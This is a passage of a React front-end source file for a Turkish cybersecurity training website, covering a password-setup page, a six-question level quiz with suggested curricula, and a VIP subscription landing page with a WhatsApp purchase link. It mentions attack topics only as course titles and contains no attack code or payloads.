          localStorage.setItem('sk_user_solved', d.user.solved_count || 0);
          localStorage.setItem('sk_user_level', d.user.level || 1);
          localStorage.setItem('sk_user_rank', d.user.rank_val || 1000);
          localStorage.setItem('sk_user_badges', d.user.badges || 0);
          localStorage.setItem('sk_user_streak', d.user.streak || 1);
          localStorage.setItem('sk_user_is_premium', d.user.is_premium ? 'true' : 'false');
          localStorage.setItem('sk_user_is_vip', d.user.is_vip ? 'true' : 'false');
          localStorage.setItem('sk_user_subscription', d.user.subscription || 'free');
        }
        window.__SK_USER_FETCHED = false;
        window.dispatchEvent(new Event('sk_user_update'));
        setDone(true);
        setTimeout(() => navigate('dashboard'), 2500);
      } else {
        setError(d.error || 'Bir hata oluştu.');
      }
    } catch (err) {
      setError('Bağlantı hatası. Lütfen tekrar deneyin.');
    } finally { setLoading(false); }
  };

  if (!token) {
    return (<><HeaderCmp navigate={navigate} /><div className="min-h-screen flex items-center justify-center"><div className="text-center"><h1 className="text-2xl text-[#eafff5] mb-4">Geçersiz Bağlantı</h1><p className="text-[#74998a] mb-6">Şifre belirleme bağlantısı geçersiz veya eksik.</p><button onClick={() => navigate('home')} className="text-[#00ff88] hover:underline font-mono">← Anasayfaya Dön</button></div></div><FooterCmp navigate={navigate} /></>);
  }

  return (
    <>
      <HeaderCmp navigate={navigate} />
      <div className="min-h-screen flex items-center justify-center px-4 py-20">
        <div className="w-full max-w-md rounded-2xl border border-[#0c2719] p-8" style={{ background: 'linear-gradient(165deg,#0a1f15,#04100a)' }}>
          {done ? (
            <div className="text-center py-6">
              <div className="w-16 h-16 rounded-full bg-[#00ff88]/10 border-2 border-[#00ff88] grid place-items-center mx-auto mb-5">
                <span className="text-[#00ff88] text-3xl">✓</span>
              </div>
              <h2 className="text-xl text-[#eafff5] font-disp font-bold mb-3">Şifreniz Belirlendi!</h2>
              <p className="text-[#9fc4b5] text-sm mb-4">Kontrol panelinize yönlendiriliyorsunuz...</p>
              <div className="w-6 h-6 border-2 border-[#00ff88] border-t-transparent rounded-full animate-spin mx-auto"></div>
            </div>
          ) : (
            <>
              <div className="text-center mb-8">
                <span className="w-10 h-10 border border-[#00ff88] rounded-lg grid place-items-center text-[#00ff88] font-mono text-base font-bold mx-auto mb-4 inline-flex">&gt;_</span>
                <h1 className="text-2xl text-[#eafff5] font-disp font-bold mb-2">Şifrenizi Belirleyin</h1>
                <p className="text-[#74998a] text-sm">Hesabınıza erişmek için güçlü bir şifre oluşturun.</p>
              </div>
              <div className="space-y-4 mb-6">
                <div>
                  <label className="block text-xs text-[#74998a] mb-1.5 font-mono">Yeni Şifre *</label>
                  <input type="password" value={pw} onChange={e => setPw(e.target.value)} placeholder="En az 6 karakter" className="w-full bg-[#04100a] border border-[#103a26] rounded-lg px-4 py-3 text-[#eafff5] text-sm font-mono placeholder-[#5c8a74] focus:border-[#00ff88] outline-none transition-colors" />
                </div>
                <div>
                  <label className="block text-xs text-[#74998a] mb-1.5 font-mono">Şifre Tekrar *</label>
                  <input type="password" value={pw2} onChange={e => setPw2(e.target.value)} placeholder="Şifrenizi tekrar girin" onKeyDown={e => e.key === 'Enter' && handleSubmit()} className="w-full bg-[#04100a] border border-[#103a26] rounded-lg px-4 py-3 text-[#eafff5] text-sm font-mono placeholder-[#5c8a74] focus:border-[#00ff88] outline-none transition-colors" />
                </div>
              </div>
              {error && <div className="mb-4 p-3 rounded-lg border border-red-500/30 bg-red-500/5 text-red-400 text-xs font-mono">{error}</div>}
              <button onClick={handleSubmit} disabled={loading} className="w-full py-3.5 font-mono font-bold text-[#021008] bg-[#00ff88] rounded-xl hover:shadow-[0_0_30px_var(--glow)] disabled:opacity-40 transition-all text-sm text-center">
                {loading ? (<span className="flex items-center justify-center gap-2"><span className="w-4 h-4 border-2 border-[#021008] border-t-transparent rounded-full animate-spin"></span>İşleniyor...</span>) : 'Şifremi Belirle'}
              </button>
            </>
          )}
        </div>
      </div>
      <FooterCmp navigate={navigate} />
    </>
  );
};

/* ============ LEVEL TEST PAGE ============ */
const LevelTestPage = ({ navigate }) => {
  const HeaderCmp = window.SKHeader || (() => null);
  const FooterCmp = window.SKFooter || (() => null);
  const [step, setStep] = useState('welcome');
  const [current, setCurrent] = useState(0);
  const [score, setScore] = useState(0);
  const [selected, setSelected] = useState(-1);
  const [email, setEmail] = useState('');

  const questions = [
    { text: 'Siber güvenlik alanında kendini nerede görüyorsun?', opts: [
      { label: 'Hiç bilgim yok, sıfırdan başlıyorum', score: 0 },
      { label: 'Teorik okudum ama pratik yapmadım', score: 1 },
      { label: 'Biraz pratik deneyimim var', score: 2 },
      { label: 'Aktif olarak öğreniyorum / çalışıyorum', score: 3 },
    ]},
    { text: 'Linux terminal kullanabiliyor musun?', opts: [
      { label: 'Ne olduğunu bilmiyorum', score: 0 },
      { label: 'Temel komutları biliyorum (ls, cd, mkdir)', score: 1 },
      { label: 'Orta seviyede kullanabiliyorum', score: 2 },
      { label: 'Dosya izinleri, servis yönetimi dahil biliyorum', score: 3 },
    ]},
    { text: 'HTTP nasıl çalışır biliyor musun?', opts: [
      { label: 'Bilmiyorum', score: 0 },
      { label: 'Duydum ama detay bilmiyorum', score: 1 },
      { label: 'Request/response, header, status code biliyorum', score: 2 },
      { label: 'Cookie, session, CORS gibi konuları anlıyorum', score: 3 },
    ]},
    { text: 'SQL nedir, biliyor musun?', opts: [
      { label: 'Bilmiyorum', score: 0 },
      { label: 'Veritabanı dili olduğunu biliyorum', score: 1 },
      { label: 'Temel sorgu yazabiliyorum', score: 2 },
      { label: 'SQL Injection mantığını da anlıyorum', score: 3 },
    ]},
    { text: 'Ağ kavramları (IP, DNS, port, TCP/UDP)?', opts: [
      { label: 'Hiç bilmiyorum', score: 0 },
      { label: 'Duydum, teorik olarak biliyorum', score: 1 },
      { label: 'Anlıyorum, temel ağ kurabiliyorum', score: 2 },
      { label: 'Protokol detaylarını ve analiz araçlarını biliyorum', score: 3 },
    ]},
    { text: 'Hangi alanda uzmanlaşmak istiyorsun?', opts: [
      { label: 'Web uygulama güvenliği', score: 0 },
      { label: 'Ağ sızma testi', score: 0 },
      { label: 'Sosyal mühendislik & phishing', score: 0 },
      { label: 'Henüz bilmiyorum, rehber ol', score: 0 },
    ]},
  ];

  const getResult = () => {
    if (score <= 4) return {
      level: 'Başlangıç Seviyesi', color: '#ffd166', emoji: '🌱',
      title: 'Sıfırdan başlıyoruz —\ntam doğru yer burası.',
      desc: "Siber güvenlik temelleri sağlam kurulmadan ilerlenmez. Seninle Linux'tan başlayıp ~10-12 hafta içinde ilk gerçek sızma testini gerçekleştirir seviyeye getiririz.",
      phases: [
        { week: 'Hafta 1-3', title: 'Temel Altyapı', detail: 'Linux terminali, ağ kavramları (IP, DNS, TCP/UDP), HTTP protokolü' },
        { week: 'Hafta 4-6', title: 'Web Güvenliği Girişi', detail: 'OWASP Top 10, form zafiyetleri, kimlik doğrulama açıkları' },
        { week: 'Hafta 7-9', title: 'Araç Kullanımı', detail: 'Tarama araçları, trafik analizi, zafiyet keşfi senaryoları' },
        { week: 'Hafta 10-12', title: 'İlk Sızma Testi', detail: 'Gerçek hedef sistemde tam senaryo, metodoloji ve raporlama' },
      ],
      outcomes: ['Linux terminalini rahat kullanırsın', 'Web uygulamalarındaki açıkları tanırsın', 'Ağ trafiğini okuyup analiz edersin', 'Eksiksiz bir sızma testi raporu yazarsın'],
      duration: '~10-12 hafta',
    };
    if (score <= 10) return {
      level: 'Orta Seviye', color: '#00ff88', emoji: '⚡',
      title: 'Teorin var —\npratiğe dökme zamanı.',
      desc: 'Kavramları biliyorsun ama henüz gerçek senaryolarda test etmedin. Birebir derslerle 6-8 hafta içinde somut, işe yarar yetkinlik kazanırsın.',
      phases: [
        { week: 'Hafta 1-2', title: 'Web Saldırı Teknikleri', detail: 'SQLi, XSS, IDOR, CSRF — gerçek uygulamalar üzerinde adım adım' },
        { week: 'Hafta 3-4', title: 'Ağ Sızma Testi', detail: 'Port tarama, servis keşfi, kimlik bilgisi saldırıları, pivot' },
        { week: 'Hafta 5-6', title: 'Gelişmiş Senaryolar', detail: 'Kimlik doğrulama bypass, mantık hataları, zincir saldırılar' },
        { week: 'Hafta 7-8', title: 'Rapor & Portfolyo', detail: 'Profesyonel pentest raporu, bulgular, CVSS skorlama' },
      ],
      outcomes: ['SQLi ve XSS saldırılarını sıfırdan uygularsın', 'Gerçek sistemlerde zafiyet keşfi yaparsın', 'Ağ içinde hareket edersin (lateral movement)', 'İşe alım sürecinde sunabileceğin rapor hazırlarsın'],
      duration: '~6-8 hafta',
    };
    return {
      level: 'İleri Seviye', color: '#a78bfa', emoji: '🔥',
      title: 'Teknik altyapın güçlü —\nsektöre geçiş odağı.',
      desc: 'Bilgini var, sistematik yaklaşım ve sektör deneyimi eksik. 4 yoğun haftada gerçek iş dünyasına hazır hale gelirsin.',
      phases: [
        { week: 'Hafta 1', title: 'İleri Saldırı Zincirleri', detail: 'Çok aşamalı exploit zinciri, güvenlik araç bypass yöntemleri' },
        { week: 'Hafta 2', title: 'Gerçek Dünya Hedefleri', detail: 'Bug bounty metodolojisi, scope analizi, raporlama standartları' },
        { week: 'Hafta 3', title: 'Pentest Süreci Yönetimi', detail: 'Kapsam belirleme, müşteri iletişimi, bulgu önceliklendirme' },
        { week: 'Hafta 4', title: 'Kariyer & İşe Giriş', detail: 'CV hazırlığı, GitHub portfolyo, teknik mülakat simülasyonu' },
      ],
      outcomes: ['Karmaşık saldırı zincirlerini bağımsız kurgularsın', 'Bug bounty programlarına başvuru yaparsın', 'Müşteriye sunum kalitesinde rapor yazarsın', 'Teknik mülakatları geçecek seviyede hazır olursun'],
      duration: '~4 hafta yoğun',
    };
  };

  const handleNext = () => {
    if (selected < 0) return;
    const ns = score + questions[current].opts[selected].score;
    setScore(ns);
    setSelected(-1);
    if (current + 1 >= questions.length) { setStep('email'); }
    else { setCurrent(c => c + 1); }
  };

  const handleEmailSubmit = async () => {
    const r = getResult();
    setStep('result');
    if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) return;
    try {
      await fetch('/api/level-test/result', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, score, level: r.level, color: r.color, duration: r.duration, phases: r.phases, outcomes: r.outcomes })
      });
    } catch (_) {}
  };

  const progress = step === 'welcome' ? 0 : (step === 'email' || step === 'result') ? 100 : Math.round((current / questions.length) * 100);
  const result = getResult();
  const btnPrimary = "w-full font-mono text-[14px] sm:text-[15px] font-bold text-[#021008] bg-[#00ff88] py-[14px] rounded-xl hover:shadow-[0_0_28px_-4px_rgba(0,255,136,.6)] hover:-translate-y-px transition-all";
  const btnGhost = "w-full font-mono text-[13px] text-[#5c8a74] py-[11px] rounded-xl border border-[#103a26] hover:border-[#1a4d2e] hover:text-[#74998a] transition-colors";

  return (
    <>
      <HeaderCmp navigate={navigate} />
      <div style={{ background: 'linear-gradient(180deg,#020806,#04100a)', minHeight: '100vh' }}>
        <div className="max-w-[600px] mx-auto px-4 sm:px-8 py-14 sm:py-24">

          <div className="text-center mb-8">
            <span className="inline-flex items-center gap-2 font-mono text-[11px] sm:text-[12px] tracking-[.12em] uppercase text-[#5cffba] border border-[#103a26] bg-[rgba(0,255,136,.04)] px-3.5 py-[7px] rounded-full">
              <span className="w-[6px] h-[6px] rounded-full bg-[#00ff88] sk-pulse"></span>
              Ücretsiz Seviye Testi
            </span>
          </div>

          <div className="rounded-2xl border border-[#103a26] overflow-hidden" style={{ background: 'linear-gradient(160deg,#06140d,#040d08)' }}>
            {step !== 'welcome' && (
              <div className="h-[3px] bg-[#0c2719]">
                <div className="h-full bg-[#00ff88] transition-all duration-500" style={{ width: progress + '%' }}></div>
              </div>
            )}
            <div className="p-6 sm:p-10">

              {step === 'welcome' && (
                <div>
                  <h1 className="text-[clamp(24px,6vw,38px)] text-[#eafff5] mb-4 tracking-[-0.02em] leading-[1.2]">
                    Seviyeni öğren,<br /><span className="text-[#00ff88]">doğru yerden başla.</span>
                  </h1>
                  <p className="text-[14px] sm:text-[15px] text-[#74998a] mb-7 leading-[1.8]">
                    6 kısa soru — 2 dakika. Siber güvenlik bilgin analiz edilir, sana özel başlangıç noktası ve müfredat belirlenir.
                  </p>
                  <div className="flex flex-wrap gap-2 mb-8">
                    {['Ücretsiz', '2 dakika', 'Kayıt gerekmez', 'Kişisel sonuç'].map((t, i) => (
                      <span key={i} className="text-[11px] sm:text-[12px] text-[#5cffba] border border-[#103a26] px-3 py-1.5 rounded-full">{t}</span>
                    ))}
                  </div>
                  <button onClick={() => setStep('quiz')} className={btnPrimary}>Testi Başlat →</button>
                  <button onClick={() => navigate('pricing')} className={btnGhost + " mt-3"}>Direkt eğitim programına git</button>
                </div>
              )}

              {step === 'quiz' && (
                <div>
                  <div className="flex items-center justify-between mb-6">
                    <span className="font-mono text-[11px] text-[#5c8a74] tracking-widest uppercase">Soru {current + 1} / {questions.length}</span>
                    <button onClick={() => { setCurrent(0); setScore(0); setSelected(-1); setStep('welcome'); }} className="font-mono text-[11px] text-[#5c8a74] hover:text-[#74998a] transition-colors">← Başa dön</button>
                  </div>
                  <p className="text-[17px] sm:text-[20px] text-[#eafff5] mb-6 leading-[1.45]">{questions[current].text}</p>
                  <div className="space-y-2.5">
                    {questions[current].opts.map((opt, i) => (
                      <button key={i} onClick={() => setSelected(i)}
                        className={"w-full text-left px-4 py-3.5 rounded-xl border transition-all " + (selected === i ? 'border-[#00ff88] bg-[rgba(0,255,136,.06)]' : 'border-[#103a26] hover:border-[#1a4d2e]')}>
                        <span className="flex items-center gap-3">
                          <span className={"w-[18px] h-[18px] rounded-full border flex-shrink-0 flex items-center justify-center transition-all " + (selected === i ? 'border-[#00ff88] bg-[#00ff88]' : 'border-[#103a26]')}>
                            {selected === i && <svg width="10" height="8" viewBox="0 0 10 8" fill="none"><path d="M1 4l3 3 5-6" stroke="#021008" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"/></svg>}
                          </span>
                          <span className={"text-[13px] sm:text-[14px] leading-[1.5] " + (selected === i ? 'text-[#eafff5]' : 'text-[#c0ddd0]')}>{opt.label}</span>
                        </span>
                      </button>
                    ))}
                  </div>
                  <button onClick={handleNext} disabled={selected < 0}
                    className={"w-full mt-6 font-mono text-[14px] sm:text-[15px] font-bold py-[14px] rounded-xl transition-all " + (selected >= 0 ? 'text-[#021008] bg-[#00ff88] hover:shadow-[0_0_28px_-4px_rgba(0,255,136,.5)] hover:-translate-y-px' : 'text-[#3d564b] bg-[#0c2719] cursor-not-allowed')}>
                    {current + 1 < questions.length ? 'Sonraki Soru →' : 'Sonucu Gör →'}
                  </button>
                </div>
              )}

              {step === 'email' && (
                <div>
                  <div className="w-12 h-12 rounded-xl border border-[#103a26] bg-[rgba(0,255,136,.06)] flex items-center justify-center text-[#00ff88] text-xl mb-6">✓</div>
                  <h2 className="text-[20px] sm:text-[22px] text-[#eafff5] mb-3">Neredeyse bitti!</h2>
                  <p className="text-[13px] sm:text-[14px] text-[#74998a] mb-6 leading-[1.75]">Sana özel yol haritasını e-postana almak için adresini gir. İstersen e-posta vermeden de sonuca geçebilirsin.</p>
                  <label className="block font-mono text-[11px] tracking-widest uppercase text-[#5c8a74] mb-2">E-posta adresi</label>
                  <input type="email" value={email} onChange={e => setEmail(e.target.value)} placeholder="ornek@email.com"
                    className="w-full bg-[#07150e] border border-[#103a26] rounded-xl px-4 py-3 text-[#cdeede] placeholder-[#3d564b] focus:border-[#00ff88] focus:outline-none transition-colors font-mono text-[13px] sm:text-[14px] mb-2" />
                  <p className="text-[11px] text-[#5c8a74] mb-6">Spam yok. Sadece sonuç ve önerilen müfredat.</p>
                  <button onClick={handleEmailSubmit} className={btnPrimary}>Sonucu Gör →</button>
                  <button onClick={() => setStep('result')} className={btnGhost + " mt-3"}>E-posta olmadan devam et</button>
                </div>
              )}

              {step === 'result' && (
                <div>
                  {/* Level header + score */}
                  <div className="flex items-start justify-between gap-4 mb-5">
                    <div>
                      <span className="inline-flex items-center gap-2 font-mono text-[11px] tracking-widest uppercase border px-3 py-1.5 rounded-full mb-3"
                        style={{ color: result.color, borderColor: result.color + '50', background: result.color + '14' }}>
                        <span>{result.emoji}</span> {result.level}
                      </span>
                      <h2 className="text-[clamp(18px,4vw,24px)] text-[#eafff5] leading-[1.3]" style={{ whiteSpace: 'pre-line' }}>{result.title}</h2>
                    </div>
                    <div className="flex-shrink-0 text-center">
                      <div className="w-[58px] h-[58px] rounded-full border-2 flex flex-col items-center justify-center"
                        style={{ borderColor: result.color, background: result.color + '18' }}>
                        <span className="font-mono text-[17px] font-bold leading-none" style={{ color: result.color }}>{score}</span>
                        <span className="font-mono text-[9px] text-[#5c8a74] leading-none mt-[2px]">/ 15</span>
                      </div>
                    </div>
                  </div>

                  {/* Score bar */}
                  <div className="mb-5">
                    <div className="h-[5px] rounded-full bg-[#0c2719] overflow-hidden relative">
                      <div className="h-full rounded-full transition-all duration-700" style={{ width: Math.round((score / 15) * 100) + '%', background: 'linear-gradient(90deg,' + result.color + '99,' + result.color + ')' }}></div>
                      <div className="absolute top-0 h-full w-px bg-[#1a4d2e]" style={{ left: '27%' }}></div>
                      <div className="absolute top-0 h-full w-px bg-[#1a4d2e]" style={{ left: '67%' }}></div>
                    </div>
                    <div className="flex justify-between font-mono text-[9px] text-[#3d564b] mt-1">
                      <span>Başlangıç</span><span>Orta</span><span>İleri</span>
                    </div>
                  </div>

                  <p className="text-[13px] sm:text-[14px] text-[#8fb8a4] mb-6 leading-[1.8]">{result.desc}</p>

                  {/* Phase timeline */}
                  <div className="border border-[#0c2719] rounded-xl overflow-hidden mb-4" style={{ background: 'rgba(0,0,0,.25)' }}>
                    <div className="px-4 sm:px-5 py-3 border-b border-[#0c2719] flex items-center justify-between">
                      <span className="font-mono text-[10px] tracking-widest uppercase text-[#5c8a74] flex items-center gap-1.5">
                        <span style={{ color: result.color }}>▸</span> Önerilen Müfredat
                      </span>
                      <span className="font-mono text-[10px] font-bold" style={{ color: result.color }}>{result.duration}</span>
                    </div>
                    <div className="divide-y divide-[#0c2719]">
                      {result.phases.map((ph, i) => (
                        <div key={i} className="flex gap-3 sm:gap-4 px-4 sm:px-5 py-3.5">
                          <div className="flex-shrink-0 pt-[2px]">
                            <div className="w-[28px] h-[28px] rounded-lg flex items-center justify-center font-mono text-[10px] font-bold"
                              style={{ background: result.color + '18', color: result.color, border: '1px solid ' + result.color + '30' }}>
                              {String(i + 1).padStart(2, '0')}
                            </div>
                          </div>
                          <div className="min-w-0">
                            <div className="flex items-center gap-2 mb-0.5">
                              <span className="font-mono text-[9px] text-[#5c8a74] tracking-wider">{ph.week}</span>
                            </div>
                            <div className="text-[13px] text-[#cdeede] font-medium mb-0.5">{ph.title}</div>
                            <div className="text-[11px] text-[#74998a] leading-[1.5]">{ph.detail}</div>
                          </div>
                        </div>
                      ))}
                    </div>
                  </div>

                  {/* Outcomes */}
                  <div className="border border-[#0c2719] rounded-xl p-4 sm:p-5 mb-6" style={{ background: 'rgba(0,0,0,.15)' }}>
                    <div className="font-mono text-[10px] tracking-widest uppercase text-[#5c8a74] mb-3 flex items-center gap-1.5">
                      <span className="text-[#00ff88]">▸</span> Program sonunda yapabileceklerin
                    </div>
                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
                      {result.outcomes.map((o, i) => (
                        <div key={i} className="flex items-start gap-2">
                          <span className="text-[#00ff88] text-[12px] mt-[2px] flex-shrink-0">✓</span>
                          <span className="text-[12px] text-[#8fb8a4] leading-[1.5]">{o}</span>
                        </div>
                      ))}
                    </div>
                  </div>

                  <button onClick={() => navigate('pricing')} className={btnPrimary}>Bu Müfredatla Eğitime Başla →</button>
                  <button onClick={() => { setCurrent(0); setScore(0); setSelected(-1); setEmail(''); setStep('welcome'); }}
                    className={btnGhost + " mt-3"}>Testi yeniden başlat</button>
                </div>
              )}

            </div>
          </div>
          <p className="text-center text-[11px] text-[#3d564b] mt-6 font-mono">siberkampus.org · Ücretsiz &amp; kayıt gerekmez</p>
        </div>
      </div>
      <FooterCmp navigate={navigate} />
    </>
  );
};

/* ============ VIP PLATFORM LANDING PAGE (ADVERTISING) ============ */
const VIPPlatformLandingPage = ({ navigate }) => {
  const HeaderCmp = window.SKHeader || (() => null);
  const FooterCmp = window.SKFooter || (() => null);
  const [activeTab, setActiveTab] = useState('ag'); // 'ag' or 'uyg'
  
  const agLessons = window.SK_LESSONS ? window.SK_LESSONS['ag-guvenligi'] || [] : [];
  const uygLessons = window.SK_LESSONS ? window.SK_LESSONS['uyg-guvenligi'] || [] : [];

  const handleWhatsAppBuy = () => {
    const phone = '905389351189';
    const msg = encodeURIComponent('Merhaba, yıllık 900 TL olan VIP Platform Erişimi paketini satın almak ve hesabımı aktifleştirmek istiyorum.');
    window.open(`https://wa.me/${phone}?text=${msg}`, '_blank');
  };

  const faqItems = [
    {
      q: "VIP Platform Paketinde neler yer alıyor?",
      a: "Paket kapsamında 30 Ağ Güvenliği ve 30 Uygulama Güvenliği olmak üzere 60 adet interaktif konu anlatımı, 600+ uzmanlaştırılmış test sorusu ve pratik saldırı/savunma senaryolarını anlatan 10+ siber güvenlik eğitim videosu bulunmaktadır."
    },
    {
      q: "Ödeme işlemi nasıl gerçekleştiriliyor ve hesabım ne zaman açılır?",
      a: "Satın al butonuna tıkladığınızda doğrudan WhatsApp hattımıza yönlendirilirsiniz. WhatsApp üzerinden iletilen IBAN adresine 900 TL transfer yaptıktan sonra dekontunuzu iletmeniz yeterlidir. Yönetici ekibimiz hesabınızı dakikalar içinde 'Premium VIP' durumuna getirerek erişiminizi aktif edecektir."
    },
    {
      q: "1'e 1 mentorluk paketinden farkı nedir?",
      a: "Platform paketi, kendi kendinize konu anlatımlarını okuyup testleri ve videoları tamamlamanız için tasarlanmıştır. Canlı Zoom/Discord dersleri içermez. Ancak platformu satın alan tüm VIP üyelerimize ilk kayıt anında 1'e 1 canlı ön görüşme ve kariyer planlama seansı hediye edilir."
    },
    {
      q: "Sertifika süreci nasıl çalışıyor?",
      a: "Platformdaki Ağ Güvenliği veya Uygulama Güvenliği modüllerindeki tüm dersleri ve testleri başarıyla tamamladığınızda, sistem otomatik olarak sizin adınıza doğrulanabilir başarı sertifikası oluşturur ve profilinize ekler."
    }
  ];

  return (
    <>
      <HeaderCmp navigate={navigate} />
      <div className="min-h-screen text-[#cdeede] pt-24 pb-16" style={{ background: 'radial-gradient(circle at 50% 10%, #0d2a1c, #020806 60%)' }}>
        {/* HERO SECTION */}
        <section className="max-w-[1200px] mx-auto px-6 text-center py-16">
          <span className="inline-flex items-center gap-2 text-[12px] tracking-[.15em] uppercase text-[#00ff88] border border-[#103a26] bg-[rgba(0,255,136,.04)] px-4 py-2 rounded-full mb-6">
            <span className="w-2 h-2 rounded-full bg-[#00ff88] shadow-[0_0_10px_#00ff88] animate-pulse"></span>
            Kampanya ve Reklam Özel Sayfası
          </span>
          <h1 className="text-[clamp(32px,5vw,60px)] font-disp font-bold text-[#eafff5] leading-[1.2] tracking-tight mb-6">
            Kendi Hacking Laboratuvarında<br/>
            <span className="text-[#00ff88] drop-shadow-[0_0_20px_rgba(0,255,136,.25)]">Siber Güvenliği Uygulamalı Öğren</span>
          </h1>
          <p className="text-[16px] text-[#74998a] max-w-[700px] mx-auto leading-relaxed mb-10">
            Sadece kuru videolar izlemeyi bırakın. 60+ interaktif konu anlatımı, 600+ uzmanlaştırılmış değerlendirme sorusu ve 10+ saldırı/savunma senaryosu videosu ile pratik yaparak kendinizi kanıtlayın.
          </p>
          
          {/* BIG CTA CARD */}
          <div className="max-w-[500px] mx-auto border border-[#00ff88]/30 rounded-3xl p-8 shadow-[0_20px_50px_rgba(0,0,0,.6),0_0_40px_rgba(0,255,136,.05)] relative overflow-hidden" style={{ background: 'linear-gradient(165deg, #071e14, #030c08)' }}>
            <div className="absolute top-0 right-0 bg-[#00ff88] text-[#021008] font-bold text-[10px] tracking-wider uppercase px-4 py-1.5 rounded-bl-2xl">
              Yıllık Sadece 900 TL
            </div>
            <div className="text-[20px] font-bold text-[#eafff5] mb-2">VIP Platform Erişimi</div>
            <div className="flex items-baseline justify-center gap-2 mb-6">
              <span className="text-[#74998a] line-through text-[16px]">1.800 TL</span>
              <span className="text-[42px] font-bold text-[#00ff88] tracking-tight">900 TL</span>
              <span className="text-[#74998a] text-sm">/ Yıl</span>
            </div>
            
            <button onClick={handleWhatsAppBuy} className="w-full font-mono text-[16px] font-bold text-[#021008] bg-[#00ff88] py-4 rounded-xl shadow-[0_0_24px_rgba(0,255,136,.3)] hover:scale-[1.02] transition-all mb-4">
              WhatsApp ile Satın Al ⚡
            </button>
            <p className="text-[12px] text-[#5c8a74] font-mono">IBAN ile güvenli transfer · Dakikalar içinde hesap aktivasyonu</p>
          </div>
        </section>

        {/* METRICS SECTION */}
        <section className="border-t border-b border-[#0c2719] bg-black/20 py-12">
          <div className="max-w-[1100px] mx-auto px-6 grid grid-cols-1 md:grid-cols-3 gap-8">
            <div className="text-center">
              <div className="text-[40px] font-bold text-[#00ff88]">10+</div>
              <div className="text-sm text-[#74998a] mt-1">Saldırı & Savunma Senaryosu Videosu</div>
            </div>
            <div className="text-center border-y md:border-y-0 md:border-x border-[#0c2719] py-6 md:py-0">
              <div className="text-[40px] font-bold text-[#00ff88]">600+</div>
              <div className="text-sm text-[#74998a] mt-1">Uzmanlaştırılmış Değerlendirme Sorusu</div>
            </div>
            <div className="text-center">
              <div className="text-[40px] font-bold text-[#00ff88]">60</div>
              <div className="text-sm text-[#74998a] mt-1">İnteraktif Konu Anlatımı Modülü</div>
            </div>
          </div>
        </section>

        {/* CURRICULUM ACCORDION */}
        <section className="max-w-[1000px] mx-auto px-6 py-20">
          <div className="text-center mb-12">
            <h2 className="text-[28px] font-bold text-[#eafff5]">Kapsamlı Hacking & Savunma Müfredatı</h2>
            <p className="text-sm text-[#74998a] mt-2">Dersleri okuyun, konu sonlarındaki test sorularını çözerek bilginizi test edin.</p>
          </div>

          <div className="flex justify-center gap-4 mb-10">
            <button 
              onClick={() => setActiveTab('ag')} 
              className={`px-6 py-2.5 rounded-lg font-mono text-sm border transition-all ${activeTab === 'ag' ? 'bg-[#00ff88] text-[#021008] border-[#00ff88] font-bold' : 'border-[#103a26] text-[#74998a] hover:border-[#00ff88]'}`}
            >
              Ağ Güvenliği (30 Ders)
            </button>
            <button 
              onClick={() => setActiveTab('uyg')} 
              className={`px-6 py-2.5 rounded-lg font-mono text-sm border transition-all ${activeTab === 'uyg' ? 'bg-[#00ff88] text-[#021008] border-[#00ff88] font-bold' : 'border-[#103a26] text-[#74998a] hover:border-[#00ff88]'}`}
            >
              Uygulama Güvenliği (30 Ders)
            </button>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
            {(activeTab === 'ag' ? agLessons : uygLessons).map((lesson, idx) => (
              <div key={idx} className="border border-[#0c2719] rounded-xl p-4 bg-[#07150e]/30 flex items-center gap-3">
                <span className="font-mono text-xs text-[#00ff88]/60 bg-[#00ff88]/5 px-2 py-1 rounded">
                  {idx + 1 < 10 ? `0${idx + 1}` : idx + 1}
                </span>
                <span className="text-[14px] text-[#eafff5] font-medium">{lesson.title}</span>
              </div>
            ))}
          </div>
        </section>

        {/* SPECIAL BENEFIT SECTION */}
        <section className="py-16 border-t border-[#0c2719]" style={{ background: 'linear-gradient(180deg, #020806, #07150e)' }}>
          <div className="max-w-[800px] mx-auto px-6 text-center">
            <span className="text-[28px]">🎁</span>
            <h2 className="text-[24px] font-bold text-[#eafff5] mt-4 mb-3">VIP Üyelerimize Özel Birebir Canlı Ön Görüşme Hediye</h2>
            <p className="text-[14.5px] text-[#74998a] leading-relaxed max-w-[600px] mx-auto">
              Platformu satın alan her üyemize, siber güvenlik yolculuğuna başlarken seviyesini belirlemek ve hedeflerini çizmek için **1\'e 1 canlı ön görüşme ve kariyer danışmanlığı** seansı hediye ediyoruz.
            </p>
          </div>
        </section>

        {/* FAQ SECTION */}
        <section className="max-w-[800px] mx-auto px-6 py-20 border-t border-[#0c2719]">
          <h2 className="text-[28px] font-bold text-center text-[#eafff5] mb-12">Sıkça Sorulan Sorular</h2>
          <div className="space-y-6">
            {faqItems.map((item, idx) => (
              <div key={idx} className="border-b border-[#0c2719] pb-6">
                <h3 className="text-[16px] text-[#eafff5] font-bold mb-3 flex items-start gap-2">
                  <span className="text-[#00ff88]">?</span> {item.q}
                </h3>
                <p className="text-[14px] text-[#74998a] leading-relaxed pl-5">{item.a}</p>
              </div>
            ))}
          </div>
        </section>

        {/* STICKY BOTTOM BAR FOR MOBILE/CONVERSION */}
        <div className="fixed bottom-0 left-0 right-0 bg-[#020806]/90 backdrop-blur-md border-t border-[#0c2719] py-4 px-6 z-50 flex items-center justify-between sm:hidden">
          <div>
            <div className="text-xs text-[#74998a]">VIP Platform Erişimi</div>
            <div className="text-lg font-bold text-[#00ff88]">900 TL <span className="text-[10px] text-[#74998a] font-normal">/ Yıl</span></div>
          </div>
          <button onClick={handleWhatsAppBuy} className="font-mono text-xs font-bold text-[#021008] bg-[#00ff88] px-4 py-2.5 rounded-lg">
            Satın Al ⚡
          </button>
        </div>
      </div>
      <FooterCmp navigate={navigate} />
    </>
  );
};
window.SKVIPPlatformLandingPage = VIPPlatformLandingPage;

/* ============ REGISTER PAGES ============ */
Object.assign(PAGES, {
  about: AboutPage,
  contact: ContactPage,
  support: SupportPage,
  terms: TermsPage,
  privacy: PrivacyPage,
  'refund-policy': RefundPolicyPage,
  'delivery-policy': DeliveryPolicyPage,
  notfound: NotFoundPage,
  tools: ToolsPage,
  pricing: PricingPage,
  product: ProductDetailPage,
  'set-password': SetPasswordPage,
  'level-test': LevelTestPage,
